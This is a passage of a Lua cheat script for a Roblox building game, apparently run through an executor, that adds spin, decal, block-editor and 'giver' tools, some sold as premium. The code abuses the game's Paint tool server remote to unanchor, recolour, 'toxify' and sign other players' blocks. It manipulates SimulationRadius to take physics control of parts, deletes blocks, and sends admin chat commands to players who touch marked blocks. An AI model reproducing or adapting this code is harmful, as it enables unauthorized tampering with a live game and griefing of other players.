local RVGui = _rvPanel.gui
local RVSpeedLabel = createToolLabel(_rvPanel.frame, "Speed: 180 /s | Axis: Y", 0.17)
local RVInput = createToolInput(_rvPanel.frame, 0.32, "Speed (/s), press Enter")
local RVStatus = _rvPanel.status

local axisRow = Instance.new("Frame")
axisRow.AnchorPoint = Vector2.new(0.5,0)
axisRow.BackgroundTransparency = 1
axisRow.Position = UDim2.new(0.5,0,0.5,0)
axisRow.Size = UDim2.new(0.84,0,0.12,0)
axisRow.Parent = _rvPanel.frame
do
    local l = Instance.new("UIListLayout")
    l.FillDirection = Enum.FillDirection.Horizontal
    l.HorizontalAlignment = Enum.HorizontalAlignment.Center
    l.Padding = UDim.new(0.04,0)
    l.Parent = axisRow
end

local rvAxis = "Y"
local axisButtons = {}
local axisColors = {
    X = {off=Color3.fromRGB(140,35,35), on=Color3.fromRGB(255,80,80)},
    Y = {off=Color3.fromRGB(35,100,35), on=Color3.fromRGB(80,220,80)},
    Z = {off=Color3.fromRGB(35,35,140), on=Color3.fromRGB(80,140,255)},
}

function updateAxisButtons()
    for axis, btn in pairs(axisButtons) do
        btn.BackgroundColor3 = axis == rvAxis and axisColors[axis].on or axisColors[axis].off
    end
end

for _, ax in ipairs({"X","Y","Z"}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.28,0,1,0)
    btn.BackgroundColor3 = axisColors[ax].off
    btn.BorderSizePixel = 0
    btn.Font = Library.BoldFont or Enum.Font.GothamBold
    btn.Text = ax
    btn.TextColor3 = Color3.fromRGB(255,255,255)
    btn.TextScaled = true
    btn.Parent = axisRow
    do local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 4); c.Parent = btn end
    axisButtons[ax] = btn
    btn.MouseButton1Click:Connect(function()
        rvAxis = ax
        updateAxisButtons()
        RVSpeedLabel.Text = "Speed: " .. (rvSpeed or 180) .. " /s | Axis: " .. ax
    end)
end
updateAxisButtons()

local rvSpeed = 180

RVInput.FocusLost:Connect(function()
    local v = tonumber(RVInput.Text)
    if v then
        rvSpeed = v
        RVSpeedLabel.Text = "Speed: " .. v .. " /s | Axis: " .. rvAxis
        RVStatus.Text = "Speed updated"
    end
    RVInput.Text = ""
end)

local rvBaseTool = Instance.new("Tool")
rvBaseTool.Name = "Rotational Velocity Tool"
rvBaseTool.ToolTip = "Spin blocks with angular velocity"
rvBaseTool.RequiresHandle = true

local rvHandlePart = Instance.new("Part")
rvHandlePart.Name = "Handle"
rvHandlePart.Size = Vector3.new(0.7, 0.7, 2.8)
rvHandlePart.Color = Color3.fromRGB(200, 75, 30)
rvHandlePart.Material = Enum.Material.SmoothPlastic
rvHandlePart.Reflectance = 0.3
rvHandlePart.CanCollide = false
rvHandlePart.Parent = rvBaseTool

do
    local mesh = Instance.new("SpecialMesh")
    mesh.MeshType = Enum.MeshType.FileMesh
    mesh.MeshId = "rbxassetid://1778999500"
    mesh.Scale = Vector3.new(0.07, 0.07, 0.07)
    mesh.Parent = rvHandlePart
end

function createrotveltool()
    local connections = {}
    local tool = rvBaseTool:Clone()
    local equipped = false
    local rvSel = nil
    local rvSBox = Instance.new("SelectionBox")
    rvSBox.Color3 = Color3.fromRGB(230, 100, 50)
    rvSBox.SurfaceColor3 = Color3.fromRGB(230, 100, 50)
    rvSBox.SurfaceTransparency = 0.65
    rvSBox.LineThickness = 0.07
    rvSBox.Parent = game.CoreGui
    table.insert(tools, {rvSBox})

    table.insert(connections, tool.Equipped:Connect(function()
        equipped = true
        RVGui.Enabled = true
        RVStatus.Text = "Click a block to select,\nthen activate to spin it"
    end))

    table.insert(connections, tool.Unequipped:Connect(function()
        if not equipped then return end
        equipped = false
        RVGui.Enabled = false
        rvSBox.Adornee = nil
        rvSel = nil
    end))

    table.insert(connections, mouse.Button1Down:Connect(function()
        if not equipped then return end
        if not IsSelectable(mouse.Target, mouse.Hit.Position) then return end
        rvSel = mouse.Target
        rvSBox.Adornee = rvSel
        RVStatus.Text = "Selected: " .. rvSel.Name
            .. "\nAxis: " .. rvAxis
            .. "\nActivate to spin!"
    end))

    table.insert(connections, tool.Activated:Connect(function()
        if not equipped then return end
        if not rvSel or not rvSel.Parent then
            RVStatus.Text = "No block selected!\nClick one first"
            return
        end

        local part = rvSel
        RVStatus.Text = "Applying spin..."

        task.spawn(function()
            local hrp = localplr.Character and localplr.Character:FindFirstChild("HumanoidRootPart")
            if not hrp then return end

            if part.Anchored then
                local paint = localplr.Character:FindFirstChild("Paint") or localplr.Backpack:FindFirstChild("Paint")
                if paint then
                    if paint.Parent ~= localplr.Character then
                        paint.Parent = localplr.Character; task.wait()
                    end
                    paint.Script.Event:FireServer(part, Enum.NormalId.Top, hrp.Position, "material", nil, "anchor", "")
                    task.wait(0.9)
                end
            end

            hrp.CFrame = CFrame.new(part.Position + Vector3.new(0, part.Size.Y / 2 + 3, 0))
            task.wait(0.25)
            localplr.SimulationRadius = math.max(localplr.SimulationRadius, 500)
            task.wait(0.35)

            local radPerSec = math.rad(rvSpeed)
            local angVec = rvAxis == "X" and Vector3.new(radPerSec, 0, 0)
                or rvAxis == "Y" and Vector3.new(0, radPerSec, 0)
                or Vector3.new(0, 0, radPerSec)

            local bav = Instance.new("BodyAngularVelocity")
            bav.MaxTorque = Vector3.new(1e9, 1e9, 1e9)
            bav.P         = 1e7
            bav.AngularVelocity = angVec
            bav.Parent    = part

            RVStatus.Text = "🌀 Spinning on " .. rvAxis .. "!\n"
                .. rvSpeed .. " °/s"

            rvSBox.Adornee = nil
            rvSel = nil
        end)
    end))

    table.insert(connections, tool.AncestryChanged:Connect(function()
        if not tool or not tool.Parent or not tool.Parent.Parent then
            for _, c in pairs(connections) do c:Disconnect() end
            rvSBox:Destroy()
        end
    end))

    table.insert(tools, {tool})
    tool.Parent = localplr.Backpack
    task.wait()
    return tool
end

local dectool = Instance.new("Tool")
dectool.Name = "Decal Tool"
local handle = Instance.new("Part")
handle.Size = Vector3.new(1,1,1)
handle.Shape = Enum.PartType.Cylinder
handle.CanCollide = false
handle.Name = "Handle"
handle.Color = Color3.fromRGB(0,255,255)
handle.Parent = dectool

function isolatenumbers(str)
    return str:gsub("%D+","")
end
function waitmemeify()
    local c = localplr.Character
    if not c then
        c = localplr.CharacterAdded:Wait()
    end
    return c:WaitForChild("Meme",10)
end
function getmemeify(returnblock)
    if localplr.Character and localplr.Character:FindFirstChild("Meme") then
        return (returnblock and localplr.Character.Meme) or isolatenumbers(localplr.Character.Meme.Front.Label.Image)
    else
        return false
    end
end

local memeifyid = "11894923077"

local drot = {}
drot[Enum.NormalId.Top] = {math.rad(90),math.rad(0),math.rad(0)}
drot[Enum.NormalId.Bottom] = {math.rad(90),math.rad(0),math.rad(0)}
drot[Enum.NormalId.Left] = {math.rad(0),math.rad(90),math.rad(0)}
drot[Enum.NormalId.Right] = {math.rad(0),math.rad(-90),math.rad(0)}
drot[Enum.NormalId.Back] = {math.rad(180),math.rad(0),math.rad(180)}
drot[Enum.NormalId.Front] = {math.rad(0),math.rad(0),math.rad(0)}
local drot2 = {}
drot2[Enum.NormalId.Top] = {math.rad(0),math.rad(1),math.rad(0)}
drot2[Enum.NormalId.Bottom] = {math.rad(0),math.rad(1),math.rad(0)}
drot2[Enum.NormalId.Left] = {math.rad(0),math.rad(0),math.rad(1)}
drot2[Enum.NormalId.Right] = {math.rad(0),math.rad(0),math.rad(1)}
drot2[Enum.NormalId.Back] = {math.rad(0),math.rad(0),math.rad(1)}
drot2[Enum.NormalId.Front] = {math.rad(0),math.rad(0),math.rad(1)}

local dsizes = {}
dsizes[Enum.NormalId.Top] = {
    "X","Z"
}
dsizes[Enum.NormalId.Bottom] = {
    "X","Z"
}
dsizes[Enum.NormalId.Left] = {
    "Z","Y"
}
dsizes[Enum.NormalId.Right] = {
    "Z","Y"
}
dsizes[Enum.NormalId.Back] = {
    "X","Y"
}
dsizes[Enum.NormalId.Front] = {
    "X","Y"
}

_decPanel = createToolPanel({name = "DecalToolGui", title = "Decal Tool", size = UDim2.new(0, 225, 0, 300)})
_decPanel.gui.Enabled = false

decalInput = createToolInput(_decPanel.frame, 0.09, "Decal ID")

local _decImgBg = Library:Create('Frame', {
    AnchorPoint      = Vector2.new(0.5, 0);
    BackgroundColor3 = Library.BackgroundColor;
    BorderSizePixel  = 0;
    Position         = UDim2.new(0.5, 0, 0, 50);
    Size             = UDim2.new(0, 86, 0, 86);
    ZIndex           = 5;
    Parent           = _decPanel.frame;
})
Library:Create('UICorner', { CornerRadius = UDim.new(0, 4); Parent = _decImgBg })
Library:AddToRegistry(_decImgBg, { BackgroundColor3 = 'BackgroundColor' })

local _decImgLabel = Library:Create('ImageLabel', {
    BackgroundTransparency = 1;
    Size                   = UDim2.new(1, 0, 1, 0);
    ScaleType              = Enum.ScaleType.Fit;
    Image                  = '';
    ZIndex                 = 6;
    Parent                 = _decImgBg;
})

_decPreview = {}
function _decPreview:SetImage(id)
    if id and id ~= '' then
        _decImgLabel.Image = 'rbxthumb://type=Asset&id=' .. tostring(id) .. '&w=420&h=420'
    else
        _decImgLabel.Image = ''
    end
end
function _decPreview:SetVisible(vis)
    _decImgBg.Visible = vis
end
_decPreview.label = _decImgLabel

_rotLabel = createToolLabel(_decPanel.frame, "Rotation: 0 deg", 0.50)

createToolButton(_decPanel.frame, "+90", 0.58, 0.06, 0.42, function()
    decalrotation = decalrotation + 90
    _rotLabel.Text = "Rotation: " .. (decalrotation % 360) .. " deg"
end)
createToolButton(_decPanel.frame, "-90", 0.58, 0.52, 0.42, function()
    decalrotation = decalrotation - 90
    _rotLabel.Text = "Rotation: " .. ((decalrotation % 360 + 360) % 360) .. " deg"
end)
createToolButton(_decPanel.frame, "180", 0.70, 0.06, 0.42, function()
    decalrotation = decalrotation + 180
    _rotLabel.Text = "Rotation: " .. (decalrotation % 360) .. " deg"
end)
createToolButton(_decPanel.frame, "Reset", 0.70, 0.52, 0.42, function()
    decalrotation = 0
    _rotLabel.Text = "Rotation: 0 deg"
end)

local fakememe = Instance.new("Part")
fakememe.CanCollide = false
fakememe.CanTouch = false
fakememe.CanQuery = false
fakememe.Transparency = 1
fakememe.Anchored = true
fakememe.Parent = workspace

local suui = Instance.new("SurfaceGui")
suui.Parent = game.CoreGui
suui.SizingMode = Enum.SurfaceGuiSizingMode.PixelsPerStud
suui.Adornee = fakememe
suui.Face = Enum.NormalId.Front
suui.Enabled = false

local imageindicator2 = Instance.new("ImageLabel")
imageindicator2.Parent = suui
imageindicator2.BackgroundTransparency = 1
imageindicator2.ImageTransparency = 0.5
imageindicator2.Position = UDim2.new(0,0,0,0)
imageindicator2.Size = UDim2.new(1,0,1,0)

function updatememeifydisplays()
    _decPreview:SetImage(memeifyid)
    imageindicator2.Image = 'rbxthumb://type=Asset&id=' .. memeifyid .. '&w=420&h=420'
end

decalrotation = 0

table.insert(scriptConnections, decalInput:GetPropertyChangedSignal("Text"):Connect(function()
    memeifyid = isolatenumbers(decalInput.Text)
    updatememeifydisplays()
end))

updatememeifydisplays()

function getfixedthing(s)
    local tb = s == Enum.NormalId.Top or s == Enum.NormalId.Bottom
    local v = Vector3.new(0,tb and -1 or -0.25,tb and -0.76 or -0.01)
    
    return v
end

function hp()
    if localplr.Character:FindFirstChild("The Arkenstone") then
        return true
    else
        if localplr.Backpack:FindFirstChild("The Arkenstone") then
            return true
        end
    end
    if localplr.Team == game.Teams.Chosen then
        return true
    end
    return false
end
function henl()
    if localplr.Character:FindFirstChild("The Arkenstone") then
        return true
    else
        if localplr.Backpack:FindFirstChild("The Arkenstone") then
            return true
        end
    end
    return false
end
function eenl(unequipothers)
    if unequipothers then
        for i,v in pairs(localplr.Character:GetChildren()) do
            if v:IsA("Tool") and v.Name ~= "The Arkenstone" then
                v.Parent = localplr.Backpack
            end
        end
    end
    if localplr.Character:FindFirstChild("The Arkenstone") then
        return true, localplr.Character["The Arkenstone"]
    else
        if localplr.Backpack:FindFirstChild("The Arkenstone") then
            localplr.Backpack["The Arkenstone"].Parent = localplr.Character
            return true, localplr.Character["The Arkenstone"]
        end
    end
    return false
end
function eb()
    if localplr.Character:FindFirstChild("BlueBucket") then
        return true, localplr.Character["BlueBucket"]
    else
        if localplr.Backpack:FindFirstChild("BlueBucket") then
            localplr.Backpack["BlueBucket"].Parent = localplr.Character
            return true, localplr.Character["BlueBucket"]
        end
    end
    return false
end

function createdecaltool()
    
    local connections = {}
    currentdectool = dectool:Clone()
    local equipped = false
    table.insert(connections, currentdectool.Equipped:Connect(function()
        equipped = true
        _decPanel.gui.Enabled = true
        suui.Enabled = true
    end))
    table.insert(connections, currentdectool.Unequipped:Connect(function()
        equipped = false
        _decPanel.gui.Enabled = false
        suui.Enabled = false
    end))
    
    table.insert(connections,currentdectool.Activated:Connect(function()
        if not equipped then
            return
        end
        if not hp() then
            sayto(localplr,"You need enlighten to use Decal Tool!")
            return
        end
        if not henl() then
            eenl()
        end
        local issel = IsSelectable(mouse.Target,mouse.Hit.Position)
        if issel and henl() then
            local selectside = mouse.TargetSurface
            selection = mouse.Target
            local mid = nil
            if getmemeify() then
                mid = getmemeify()
            else
                sayto(nil,";memeify "..memeifyid)
                mid = memeifyid
                waitmemeify()
            end
            if mid ~= memeifyid then
                sayto(nil,";memeify "..memeifyid)
                waitmemeify()
            end
            local memeifyblock = getmemeify(true)
            local dsizes2 = dsizes[selectside]
            local firstone,secondone = dsizes2[1],dsizes2[2]
            if decalrotation%180 == 90 then
                firstone,secondone = dsizes2[2],dsizes2[1]
            end
            local screwroblox = drot[selectside]
            local screwroblox2 = drot2[selectside]
            local lat = (CFrame.Angles(screwroblox[1]+screwroblox2[1]*decalrotation,screwroblox[2]+screwroblox2[2]*decalrotation,screwroblox[3]+screwroblox2[3]*decalrotation))
            local surfacecfr = CFrame.new(CFrame.new(selection.Position + Vector3.new(0,-1,0) + (Vector3.FromNormalId(selectside)*selection.Size/2)) * lat * getfixedthing(selectside)) * lat

            local looping = true
            pcall(function()
                if gcp("hum").RigType ~= Enum.HumanoidRigType.R15 then
                    sayto(nil,";r15 me")
                    task.wait(3)
                end
                gcp("hum").PlatformStand = true

                coroutine.wrap(function()
                    while looping do
                        gcp("hrp").CFrame = surfacecfr
                        task.wait()
                    end
                end)()
                task.wait(1.5)
                sayto(nil,string.format(";width me %.4g", selection.Size[firstone]/6))
                task.wait(1.5)
                sayto(nil,string.format(";height me %.4g", selection.Size[secondone]/6))
                task.wait(2.5)
                if gcp("hrp").CollisionGroup ~= "NoClip" then
                    sayto(nil,";noclip me")
                    task.wait(3)
                end
                sayto(nil,";freeze me")
                task.wait(1)
                sayto(nil,";clone me")
                task.wait(1)
                sayto(nil,";unfreeze me")
                gcp("hum").PlatformStand = false
            end)
            looping = false
        end
    end))

    table.insert(connections,game:GetService("RunService").Heartbeat:Connect(function()
        if equipped and mouse.Target and IsSelectable(mouse.Target,mouse.Hit.Position) and mouse.TargetSurface then
            local selectside = mouse.TargetSurface
            local selection = mouse.Target
            local dsizes2 = dsizes[selectside]
            local firstone,secondone = dsizes2[1],dsizes2[2]
            if decalrotation%180 == 90 then
                firstone,secondone = dsizes2[2],dsizes2[1]
            end
            fakememe.Size = Vector3.new(selection.Size[firstone],selection.Size[secondone],0.001)
            local screwroblox = drot[selectside]
            local screwroblox2 = drot2[selectside]
            local lat = (CFrame.Angles(screwroblox[1]+screwroblox2[1]*decalrotation,screwroblox[2]+screwroblox2[2]*decalrotation,screwroblox[3]+screwroblox2[3]*decalrotation))
            local tb = selectside == Enum.NormalId.Top or selectside == Enum.NormalId.Bottom
            local surfacecfr = CFrame.new(CFrame.new(selection.Position + (Vector3.FromNormalId(selectside)*selection.Size/2)) * lat * getfixedthing(selectside)) * lat
            fakememe.CFrame = surfacecfr
            suui.Adornee = fakememe
        else
            suui.Adornee = nil
        end
    end))
    
    table.insert(connections,currentdectool.AncestryChanged:Connect(function()
        if not currentdectool or not currentdectool.Parent or not currentdectool.Parent.Parent then
            for i,v in pairs(connections) do
                v:Disconnect()
            end
        end
    end))
    
    table.insert(tools,{
        currentdectool
    })
    
    currentdectool.Parent = localplr.Backpack
    task.wait()
    
    return currentdectool
end

local _edPanel = createToolPanel({
    name = "EditorToolGui",
    title = "Block Editor",
    anchor = Vector2.new(1, 0),
    position = UDim2.new(1, -10, 0.15, 0),
    size = UDim2.new(0, 200, 0, 290),
    statusText = "Click a block to select"
})
local EditorGui = _edPanel.gui
local EditorInfo = _edPanel.status
local edColorBox = createToolInput(_edPanel.frame, 0.13, "R,G,B (e.g. 255,0,0)")
local edMatBox   = createToolInput(_edPanel.frame, 0.24, "Material (e.g. Neon)")
local _editorSel = nil

local function edPaint()
    local pt = localplr.Character and (localplr.Character:FindFirstChild("Paint") or localplr.Backpack:FindFirstChild("Paint"))
    if not pt then return nil, nil end
    if pt.Parent ~= localplr.Character then pt.Parent = localplr.Character; task.wait() end
    local ps = pt:FindFirstChild("Script")
    if ps and ps:FindFirstChild("Event") then return ps, ps.Event end
    return nil, nil
end

createToolButton(_edPanel.frame, "Color", 0.36, 0.05, 0.28, function()
    if not _editorSel or not _editorSel.Parent then return end
    local parts = string.split(edColorBox.Text, ",")
    if #parts < 3 then return end
    local r, g, b = tonumber(parts[1]), tonumber(parts[2]), tonumber(parts[3])
    if not r or not g or not b then return end
    local ps, ev = edPaint()
    if ev then ev:FireServer(_editorSel, Enum.NormalId.Top, getplrpos(), "color", Color3.fromRGB(r,g,b), "", ""); EditorInfo.Text = "Color applied" end
end)
createToolButton(_edPanel.frame, "Material", 0.36, 0.36, 0.28, function()
    if not _editorSel or not _editorSel.Parent then return end
    local ps, ev = edPaint()
    if ev then ev:FireServer(_editorSel, Enum.NormalId.Top, getplrpos(), "material", nil, edMatBox.Text:lower(), ""); EditorInfo.Text = "Material applied" end
end)
createToolButton(_edPanel.frame, "All Sides", 0.36, 0.67, 0.28, function()
    if not _editorSel or not _editorSel.Parent then return end
    local parts = string.split(edColorBox.Text, ",")
    if #parts < 3 then return end
    local r, g, b = tonumber(parts[1]), tonumber(parts[2]), tonumber(parts[3])
    if not r or not g or not b then return end
    local col = Color3.fromRGB(r,g,b)
    local ps, ev = edPaint()
    if ev then
        for _, face in ipairs({Enum.NormalId.Top, Enum.NormalId.Bottom, Enum.NormalId.Front, Enum.NormalId.Back, Enum.NormalId.Left, Enum.NormalId.Right}) do
            ev:FireServer(_editorSel, face, getplrpos(), "color", col, "", "")
        end
        EditorInfo.Text = "All sides painted"
    end
end)
createToolButton(_edPanel.frame, "Anchor", 0.48, 0.05, 0.28, function()
    if not _editorSel or not _editorSel.Parent then return end
    local ps, ev = edPaint()
    if ev then ev:FireServer(_editorSel, Enum.NormalId.Top, getplrpos(), "material", nil, "anchor", ""); EditorInfo.Text = "Toggled anchor" end
end)
createToolButton(_edPanel.frame, "Toxify", 0.48, 0.36, 0.28, function()
    if not _editorSel or not _editorSel.Parent then return end
    local ps, ev = edPaint()
    if ev then ev:FireServer(_editorSel, Enum.NormalId.Top, getplrpos(), "material", Color3.new(0,0,0), "toxic", ""); EditorInfo.Text = "Toxified" end
end)
createToolButton(_edPanel.frame, "Delete", 0.48, 0.67, 0.28, function()
    if not _editorSel or not _editorSel.Parent then return end
    ExecuteDelete(_editorSel); EditorInfo.Text = "Deleted"; _editorSel = nil
end)

local edSignBox = createToolInput(_edPanel.frame, 0.61, "Sign text")
createToolButton(_edPanel.frame, "Sign", 0.74, 0.05, 0.44, function()
    if not _editorSel or not _editorSel.Parent or edSignBox.Text == "" then return end
    local ps, ev = edPaint()
    if ev then ev:FireServer(_editorSel, Enum.NormalId.Front, getplrpos(), "both \u{1F91D}", _editorSel.Color, "", edSignBox.Text); EditorInfo.Text = "Sign applied" end
end)
createToolButton(_edPanel.frame, "Clone", 0.74, 0.52, 0.44, function()
    if not _editorSel or not _editorSel.Parent then return end
    local hrp = localplr.Character and localplr.Character:FindFirstChild("HumanoidRootPart")
    if hrp then ExecuteBuild(snap(hrp.Position + hrp.CFrame.LookVector * 6)); EditorInfo.Text = "Cloned" end
end)

local EditorBlockInfo = createToolLabel(_edPanel.frame, "", 0.87)
EditorBlockInfo.BackgroundTransparency = 1

function createeditortool()
    local connections = {}
    local edTool = Instance.new("Tool")
    edTool.Name = "Editor Tool"
    edTool.ToolTip = "Click blocks to edit properties"
    edTool.RequiresHandle = true

    local edHandle = Instance.new("Part")
    edHandle.Name = "Handle"
    edHandle.Size = Vector3.new(0.6, 0.6, 2.5)
    edHandle.Color = Color3.fromRGB(0, 85, 255)
    edHandle.Material = Enum.Material.SmoothPlastic
    edHandle.Reflectance = 0.2
    edHandle.CanCollide = false
    edHandle.Parent = edTool
    do
        local mesh = Instance.new("SpecialMesh")
        mesh.MeshType = Enum.MeshType.FileMesh
        mesh.MeshId = "rbxassetid://430736398"
        mesh.Scale = Vector3.new(0.35, 0.35, 0.5)
        mesh.Parent = edHandle
    end

    local equipped = false
    local edSBox = Instance.new("SelectionBox")
    edSBox.Color3 = Color3.fromRGB(0, 85, 255)
    edSBox.SurfaceColor3 = Color3.fromRGB(0, 85, 255)
    edSBox.SurfaceTransparency = 0.7
    edSBox.LineThickness = 0.07
    edSBox.Parent = game.CoreGui
    table.insert(tools, {edSBox})

    table.insert(connections, edTool.Equipped:Connect(function()
        equipped = true
        EditorGui.Enabled = true
        EditorInfo.Text = "Click a block to select"
    end))

    table.insert(connections, edTool.Unequipped:Connect(function()
        if not equipped then return end
        equipped = false
        EditorGui.Enabled = false
        edSBox.Adornee = nil
        _editorSel = nil
    end))

    table.insert(connections, mouse.Button1Down:Connect(function()
        if not equipped then return end
        if not IsSelectable(mouse.Target, mouse.Hit.Position) then return end
        _editorSel = mouse.Target
        edSBox.Adornee = _editorSel
        local c = _editorSel.Color
        edColorBox.Text = math.floor(c.R*255) .. "," .. math.floor(c.G*255) .. "," .. math.floor(c.B*255)
        edMatBox.Text = tostring(_editorSel.Material):gsub("Enum.Material.", "")
        EditorInfo.Text = "Selected block"
        EditorBlockInfo.Text = string.format("Pos: %.0f,%.0f,%.0f | Size: %.0f,%.0f,%.0f | %s",
            _editorSel.Position.X, _editorSel.Position.Y, _editorSel.Position.Z,
            _editorSel.Size.X, _editorSel.Size.Y, _editorSel.Size.Z,
            _editorSel.Anchored and "Anchored" or "Unanchored")
    end))

    table.insert(connections, edTool.AncestryChanged:Connect(function()
        if not edTool or not edTool.Parent or not edTool.Parent.Parent then
            for _, c in pairs(connections) do c:Disconnect() end
            edSBox:Destroy()
            EditorGui.Enabled = false
        end
    end))

    table.insert(tools, {edTool})
    edTool.Parent = localplr.Backpack
    task.wait()
    return edTool
end
end -- /══ Custom Tool Helpers ══

do -- ══ Custom Tools Groupbox ══
AdvancedGroup = Tabs.Chat:CreateModule({Name = 'Custom Tools'})

AdvancedGroup:CreateButton({
    Name = 'Rotate Tool',
    Function = function()
        createrotool().Parent = (plr.Character and not plr.Character:FindFirstChildWhichIsA("Tool") and plr.Character) or plr.Backpack
        Library:Notify("Rotate tool added to backpack", 3)
    end
})

local DecalToolButton = AdvancedGroup:CreateButton({
    Name = 'Decal Tool',
    Function = _requirePremium(function()
        createdecaltool().Parent = (plr.Character and not plr.Character:FindFirstChildWhichIsA("Tool") and plr.Character) or plr.Backpack
        Library:Notify("Decal tool added to backpack", 3)
    end)
})
registerPremiumButtonLock(DecalToolButton, 'Decal Tool', {
    subtitleText = 'Premium tool',
    helperText = 'Tap for premium',
})

local EditorToolButton = AdvancedGroup:CreateButton({
    Name = 'Editor Tool',
    Function = _requirePremium(function()
        createeditortool().Parent = (plr.Character and not plr.Character:FindFirstChildWhichIsA("Tool") and plr.Character) or plr.Backpack
        Library:Notify("Editor tool added to backpack", 3)
    end)
})
registerPremiumButtonLock(EditorToolButton, 'Editor Tool', {
    subtitleText = 'Premium tool',
    helperText = 'Tap for premium',
})

sanitizename = function(txt)
    if string.sub(txt,1,3):lower() == "btc" then txt = "bt" end
    if string.sub(txt,1,3):lower() == "fat" then txt = "fa" end
    if not isog then txt = string.gsub(txt,"_",".") end
    return string.sub(txt,1,7)
end

end -- /══ Custom Tools Groupbox ══

do -- ══ Giver Tool ══
local _GIVER_MODES = {"R6", "Carpet", "Fly", "Bkit", "Paint"}
local giverBlocks  = {R6 = {}, Carpet = {}, Fly = {}, Bkit = {}, Paint = {}}
local giverTagged  = {}
local giverSelecting = false
local giverSelMode   = "R6"
local giverMode      = "R6"

local function giverGetTag(uid, block)
    return giverTagged[uid] and giverTagged[uid][block] and giverTagged[uid][block] > tick()
end
local function giverSetTag(uid, block, dur)
    if not giverTagged[uid] then giverTagged[uid] = {} end
    giverTagged[uid][block] = tick() + dur
end
local function giverEquipArken()
    local arken = localplr.Backpack:FindFirstChild("The Arkenstone")
        or (localplr.Character and localplr.Character:FindFirstChild("The Arkenstone"))
    if arken and arken.Parent == localplr.Backpack then
        pcall(function() arken.Parent = localplr.Character end)
    end
end

-- Send a chat command with TextChatService; fallback to legacy chat on failure
local function giverSendCmd(msg)
    local ok = sendGeneralChatMessage(msg)
    if not ok then
        pcall(function()
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
        end)
    end
end

-- Mode colours for SelectionBox tinting when active
local _giverActiveColors = {
    R6     = Color3.fromRGB(255, 200, 0),
    Carpet = Color3.fromRGB(139, 90,  43),
    Fly    = Color3.fromRGB(0,   180, 255),
    Bkit   = Color3.fromRGB(0,   210, 100),
    Paint  = Color3.fromRGB(230, 80,  200),
}

-- Commands fired for each mode (first %s = sanitized player name)
local _giverCmds = {
    R6     = ";r6 %s",
    Carpet = ";carpet %s",
    Fly    = ";fly %s",
    Bkit   = ";bkit %s",
    Paint  = ";paint %s",
}

local _giverPanel = createToolPanel({
    name = "GiverToolGui",
    title = "Giver Tool",
    anchor = Vector2.new(1, 0),
    position = UDim2.new(1, -10, 0.15, 0),
    size = UDim2.new(0, 215, 0, 380),
    statusText = "Equip to start"
})
local GiverGui  = _giverPanel.gui
local GiverInfo = _giverPanel.status
GiverGui.Enabled = false

local giverModeLabel  = createToolLabel(_giverPanel.frame, "Mode: Give R6", 0.07)
local giverCountLabel = createToolLabel(_giverPanel.frame, "Blocks: 0", 0.14)

local function giverUpdateUI()
    local cnt = 0
    for _ in pairs(giverBlocks[giverMode] or {}) do cnt = cnt + 1 end
    giverModeLabel.Text  = "Mode: Give " .. giverMode
    giverCountLabel.Text = giverMode .. " blocks: " .. cnt
end

-- Row 1: R6 / Carpet
createToolButton(_giverPanel.frame, "Give R6", 0.21, 0.03, 0.45, function()
    if giverSelecting then return end
    giverMode = "R6"; giverUpdateUI(); GiverInfo.Text = "Mode: Give R6"
end)
createToolButton(_giverPanel.frame, "Give Carpet", 0.21, 0.52, 0.45, function()
    if giverSelecting then return end
    giverMode = "Carpet"; giverUpdateUI(); GiverInfo.Text = "Mode: Give Carpet"
end)
-- Row 2: Fly / Bkit
createToolButton(_giverPanel.frame, "Give Fly", 0.31, 0.03, 0.45, function()
    if giverSelecting then return end
    giverMode = "Fly"; giverUpdateUI(); GiverInfo.Text = "Mode: Give Fly"
end)
createToolButton(_giverPanel.frame, "Give Bkit", 0.31, 0.52, 0.45, function()
    if giverSelecting then return end
    giverMode = "Bkit"; giverUpdateUI(); GiverInfo.Text = "Mode: Give Bkit"
end)
-- Row 3: Paint (full width)
createToolButton(_giverPanel.frame, "Give Paint", 0.41, 0.03, 0.94, function()
    if giverSelecting then return end
    giverMode = "Paint"; giverUpdateUI(); GiverInfo.Text = "Mode: Give Paint"
end)

-- Row 4: Select Blocks
createToolButton(_giverPanel.frame, "Select Blocks", 0.52, 0.03, 0.94, function()
    if giverSelecting then return end
    giverSelecting = true
    giverSelMode = giverMode
    for _, data in pairs(giverBlocks[giverSelMode]) do
        if data.SelectionBox then data.SelectionBox.LineThickness = 0.1 end
    end
    GiverInfo.Text = "Click " .. giverSelMode .. " blocks. Finish when done."
end)

-- Row 5: Finish / Cancel
createToolButton(_giverPanel.frame, "Finish", 0.63, 0.03, 0.45, function()
    if not giverSelecting then GiverInfo.Text = "Not in selection mode"; return end
    giverSelecting = false
    local mode = giverSelMode
    local count = 0
    local activeCol = _giverActiveColors[mode] or Color3.fromRGB(255, 200, 0)
    for block, data in pairs(giverBlocks[mode]) do
        if data.SelectionBox then data.SelectionBox.LineThickness = -1 end
        if not data.Active then
            data.Active = true
            if data.SelectionBox then
                data.SelectionBox.Color3 = activeCol
                data.SelectionBox.SurfaceColor3 = activeCol
            end
            data.OnTouched = block.Touched:Connect(function(hit)
                if not giverBlocks[mode] or not giverBlocks[mode][block] then return end
                local p = hit
                local touchPlr = nil
                repeat
                    touchPlr = game.Players:GetPlayerFromCharacter(p.Parent)
                    p = p.Parent
                until touchPlr or not p or p == workspace or p == game
                if not touchPlr or not touchPlr.Character then return end
                local tHum = touchPlr.Character:FindFirstChildOfClass("Humanoid")
                if not tHum then return end
                local uid = touchPlr.UserId
                if giverGetTag(uid, block) then return end

                -- R6 only applies to non-R6 players; others apply to everyone
                if mode == "R6" and tHum.RigType == Enum.HumanoidRigType.R6 then return end
                -- Don't give carpet to someone who already has it
                if mode == "Carpet" and touchPlr.Character:FindFirstChild("RainbowMagicCarpet") then return end

                giverSetTag(uid, block, 3)
                local cmd = string.format(_giverCmds[mode] or (";%s %%s"):format(mode:lower()), sanitizename(touchPlr.Name))
                task.spawn(function()
                    giverEquipArken()
                    task.wait(0.15) -- ensure Arkenstone is equipped before sending command
                    giverSendCmd(cmd)
                end)
            end)
        end
        count = count + 1
    end
    GiverInfo.Text = mode .. " active: " .. count .. " block(s)"
    giverUpdateUI()
end)

createToolButton(_giverPanel.frame, "Cancel", 0.63, 0.52, 0.45, function()
    if not giverSelecting then return end
